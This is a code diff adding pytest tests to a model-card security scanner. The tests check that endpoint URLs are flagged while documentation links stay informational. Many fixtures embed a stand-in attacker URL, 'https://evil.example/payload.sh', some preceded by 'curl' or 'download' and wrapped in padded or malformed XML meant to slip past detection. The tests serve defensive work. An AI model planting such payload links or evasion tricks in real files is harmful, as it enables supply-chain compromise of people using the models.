@@ -4,12 +4,17 @@ from typing import Any
 
 import pytest
 
+import modelaudit.scanners.text_scanner as text_scanner_module
 from modelaudit.cache import get_cache_manager, reset_cache_manager
 from modelaudit.core import determine_exit_code, scan_file, scan_model_directory_or_file
 from modelaudit.detectors import network_comm
 from modelaudit.scanner_results import SCAN_OUTCOME_MESSAGE_METADATA_KEY
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.text_scanner import MAX_TOKENIZER_VOCABULARY_CC_RETARGET_OCCURRENCES, TextScanner
+from modelaudit.scanners.text_scanner import (
+    MAX_TEXT_FINDING_CONTEXT_BYTES,
+    MAX_TOKENIZER_VOCABULARY_CC_RETARGET_OCCURRENCES,
+    TextScanner,
+)
 from modelaudit.utils.helpers import cache_decorator
 
 
@@ -244,6 +249,492 @@ def test_text_scanner_model_card_cloud_url_preserves_higher_actionable_severity(
         "domain_name",
         "url_detected",
     }
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_endpoint_label_markdown_link_stays_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("Endpoint: [API docs](https://docs.example.com)\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "- Endpoint: [API docs](https://docs.example.com)\n",
+        "Intro\n- Endpoint: [API docs](https://docs.example.com)\n",
+        "- Callback: [API docs](https://docs.example.com)\n",
+        "- Webhook: [API docs](https://docs.example.com)\n",
+    ],
+)
+def test_text_scanner_model_card_capitalized_bullet_label_markdown_links_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_markdown_link_context_prefix_remains_bounded() -> None:
+    payload = b"intro\n" + (b"a" * (MAX_TEXT_FINDING_CONTEXT_BYTES * 4)) + b"\n[API docs](https://docs.example.com)\n"
+    position = payload.index(b"https://")
+
+    context_prefix = TextScanner._documentation_markdown_link_context_prefix(payload, position)
+
+    assert context_prefix is not None
+    assert len(context_prefix) <= MAX_TEXT_FINDING_CONTEXT_BYTES
+
+
+def test_text_scanner_url_evidence_at_position_bounds_long_xml_prefix(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    url = b"https://evil.example/payload.sh"
+    attrs = b"".join(
+        b" data" + str(index).encode("ascii") + b'="scheme' + str(index).encode("ascii") + b"://" + (b"x" * 64) + b'"'
+        for index in range(512)
+    )
+    payload = b"<cfg:endpoint" + attrs + b' callback="' + url + b'"></cfg:endpoint>\n'
+    position = payload.index(url)
+    line_lookup = {position: (0, len(payload) - 1, 1)}
+    finding = {
+        "type": "url_detected",
+        "severity": "HIGH",
+        "url": url.decode("ascii"),
+        "position": position,
+    }
+
+    assert TextScanner._documentation_finding_is_actionable(payload, finding)
+
+    original_pattern = text_scanner_module.BARE_NETWORK_URL_TOKEN_PATTERN
+
+    class BoundedUrlPattern:
+        max_candidate_bytes: int = 0
+
+        def fullmatch(self, candidate: bytes) -> Any:
+            self.max_candidate_bytes = max(self.max_candidate_bytes, len(candidate))
+            assert len(candidate) <= len(url)
+            return original_pattern.fullmatch(candidate)
+
+    bounded_pattern = BoundedUrlPattern()
+    monkeypatch.setattr(text_scanner_module, "BARE_NETWORK_URL_TOKEN_PATTERN", bounded_pattern)
+
+    evidence = TextScanner._documentation_url_evidence_at_position(payload, position, line_lookup)
+
+    assert bounded_pattern.max_candidate_bytes == len(url)
+    assert evidence == {
+        "kind": "url",
+        "value": url.decode("ascii"),
+        "line": 1,
+        "column": position + 1,
+        "span_start": position,
+        "span_end": position + len(url),
+    }
+
+
+def test_text_scanner_model_card_unknown_xml_markdown_context_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr(text_scanner_module, "MAX_TEXT_TRUNCATED_XML_CONTEXT_BYTES", 64)
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '<endpoint data="' + ("x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 128)) + '">download '
+        "[here](https://evil.example/payload.sh)</endpoint>\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("closing_tag", ["</endpoint>", "</webhook>"])
+def test_text_scanner_model_card_truncated_xml_closing_tag_markdown_context_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    closing_tag: str,
+) -> None:
+    monkeypatch.setattr(text_scanner_module, "MAX_TEXT_TRUNCATED_XML_CONTEXT_BYTES", 64)
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '<endpoint data="'
+        + ("x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 128))
+        + f'">{closing_tag}download [here](https://evil.example/payload.sh)</endpoint>\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize("closing_tag", ["</endpoint>", "</webhook>"])
+def test_text_scanner_model_card_truncated_xml_closing_tag_direct_url_context_fails_closed(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+    closing_tag: str,
+) -> None:
+    monkeypatch.setattr(text_scanner_module, "MAX_TEXT_TRUNCATED_XML_CONTEXT_BYTES", 64)
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        '<endpoint data="'
+        + ("x" * (MAX_TEXT_FINDING_CONTEXT_BYTES + 128))
+        + f'">{closing_tag}download https://evil.example/payload.sh</endpoint>\n',
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_direct_endpoint_url_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("endpoint: https://evil.example/payload\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "- endpoint:\n  url: https://evil.example/payload.sh\n",
+        "- callback:\n  uri: https://evil.example/payload.sh\n",
+        "- webhook:\n  url: https://evil.example/payload.sh\n",
+    ],
+)
+def test_text_scanner_model_card_top_level_list_object_endpoint_urls_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_model_card_namespaced_xml_endpoint_url_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text("<cfg:endpoint>https://evil.example/payload.sh</cfg:endpoint>\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "<cfg:endpoint>download https://evil.example/payload.sh</cfg:endpoint>\n",
+        "<endpoint></webhook>download https://evil.example/payload.sh</endpoint>\n",
+        "<endpoint></endpointDocs>download https://evil.example/payload.sh</endpoint>\n",
+        "<callback></callbackDocs>download https://evil.example/payload.sh</callback>\n",
+        "<webhook></webhookDocs>download https://evil.example/payload.sh</webhook>\n",
+        '<endpoint data="' + ("x" * 5000) + '"></webhook>download https://evil.example/payload.sh</endpoint>\n',
+        '<endpoint url="https://evil.example/payload.sh" />\n',
+        '<cfg:endpoint value="https://evil.example/payload.sh" />\n',
+        '<cfg:endpoint data="' + ("x" * 600) + '" url="https://evil.example/payload.sh" />\n',
+        '<cfg:endpoint data="' + ("x" * 600) + '">download https://evil.example/payload.sh</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 5000) + '">download https://evil.example/payload.sh</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 5000) + '" /> curl https://evil.example/payload.sh\n',
+        '<cfg:endpoint data="' + ("x" * 17000) + '">download https://evil.example/payload.sh</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 17000) + '" /> curl https://evil.example/payload.sh\n',
+    ],
+)
+def test_text_scanner_model_card_leading_text_namespaced_xml_endpoint_url_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '{"endpoint": "[download](https://evil.example/payload.sh)"}\n',
+        "endpoint: [download](https://evil.example/payload.sh)\n",
+        "Intro\nendpoint: [download](https://evil.example/payload.sh)\n",
+        "callback: [download](https://evil.example/payload.sh)\n",
+        "webhook: [download](https://evil.example/payload.sh)\n",
+        'endpoint: "[download](https://evil.example/payload.sh)"\n',
+        'endpoint:\n  url: "[download](https://evil.example/payload.sh)"\n',
+        "endpoints:\n- [download](https://evil.example/payload.sh)\n",
+        "endpoints:\n  - [download](https://evil.example/payload.sh)\n",
+        "callback:\n- [download](https://evil.example/payload.sh)\n",
+        "webhooks:\n  - [download](https://evil.example/payload.sh)\n",
+        "- endpoint: [download](https://evil.example/payload.sh)\n",
+        "Intro\n- endpoint: [download](https://evil.example/payload.sh)\n",
+        "- callback: [download](https://evil.example/payload.sh)\n",
+        "- webhook: [download](https://evil.example/payload.sh)\n",
+        "- endpoint:\n  url: [download](https://evil.example/payload.sh)\n",
+        "- callback:\n  uri: [download](https://evil.example/payload.sh)\n",
+        "- webhook:\n  url: [download](https://evil.example/payload.sh)\n",
+        "<endpoint>[download](https://evil.example/payload.sh)</endpoint>\n",
+    ],
+)
+def test_text_scanner_model_card_structured_endpoint_markdown_links_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        '{"endpoint": "download [here](https://evil.example/payload.sh)"}\n',
+        'endpoint: "download [here](https://evil.example/payload.sh)"\n',
+        "endpoint: 'don''t use [here](https://evil.example/payload.sh)'\n",
+        'endpoint:\n  url: "download [here](https://evil.example/payload.sh)"\n',
+        'endpoints:\n- url: "download [here](https://evil.example/payload.sh)"\n',
+        "<endpoint>download [here](https://evil.example/payload.sh)</endpoint>\n",
+        "<endpoint></webhook>download [here](https://evil.example/payload.sh)</endpoint>\n",
+        '<endpoint data="'
+        + ("x" * 17000)
+        + '"></endpointDocs>download [here](https://evil.example/payload.sh)</endpoint>\n',
+        "<callback></callbackDocs>download [here](https://evil.example/payload.sh)</callback>\n",
+        "<webhook></webhookDocs>download [here](https://evil.example/payload.sh)</webhook>\n",
+        "<cfg:endpoint>download [here](https://evil.example/payload.sh)</cfg:endpoint>\n",
+        '<endpoint label="download [here](https://evil.example/payload.sh)" />\n',
+        '<cfg:endpoint data="' + ("x" * 600) + '">download [here](https://evil.example/payload.sh)</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 4200) + '">download [here](https://evil.example/payload.sh)</cfg:endpoint>\n',
+        '<cfg:endpoint data="' + ("x" * 17000) + '">download [here](https://evil.example/payload.sh)</cfg:endpoint>\n',
+        '<endpoint data="' + ("x" * 5000) + '"></webhook>download [here](https://evil.example/payload.sh)</endpoint>\n',
+    ],
+)
+def test_text_scanner_model_card_leading_text_structured_endpoint_markdown_links_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "<endpoint>API docs</endpoint> https://docs.example.com/reference\n",
+        "<endpoint>API docs</endpoint> [API docs](https://docs.example.com/reference)\n",
+        '<endpoint data="' + ("x" * 5000) + '">API docs</endpoint> https://docs.example.com/reference\n',
+        "<endpoint /> [API docs](https://docs.example.com/reference)\n",
+        '<endpoint enabled="false" /> [API docs](https://docs.example.com/reference)\n',
+        '<endpoint note=">" /> [API docs](https://docs.example.com/reference)\n',
+        '<endpoint data="' + ("x" * 5000) + '" /> https://docs.example.com/reference\n',
+        '<endpoint data="' + ("x" * 17000) + '" /> https://docs.example.com/reference\n',
+        '<endpoint data="' + ("x" * 5000) + '" /> [API docs](https://docs.example.com/reference)\n',
+    ],
+)
+def test_text_scanner_model_card_closed_xml_endpoint_links_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "- endpoint:\n- url: https://docs.example.com/reference\n",
+        "- endpoint:\n- url: [API docs](https://docs.example.com/reference)\n",
+    ],
+)
+def test_text_scanner_model_card_sibling_yaml_list_items_stay_informational(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert network_checks
+    assert all(check.severity == IssueSeverity.INFO for check in network_checks)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_model_card_namespaced_xml_endpoint_markdown_link_remains_actionable(
+    tmp_path: Path,
+) -> None:
+    text_path = tmp_path / "model_card.md"
+    text_path.write_text(
+        "<cfg:endpoint>[download](https://evil.example/payload.sh)</cfg:endpoint>\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    network_checks = _failed_network_detection_checks(result)
+
+    assert any(
+        check.details.get("type") == "url_detected"
+        and check.details.get("normalized_evidence")
+        == {
+            "kind": "url",
+            "value": "https://evil.example/payload.sh",
+        }
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in network_checks
+    )
     assert determine_exit_code(aggregate) == 1
 
 
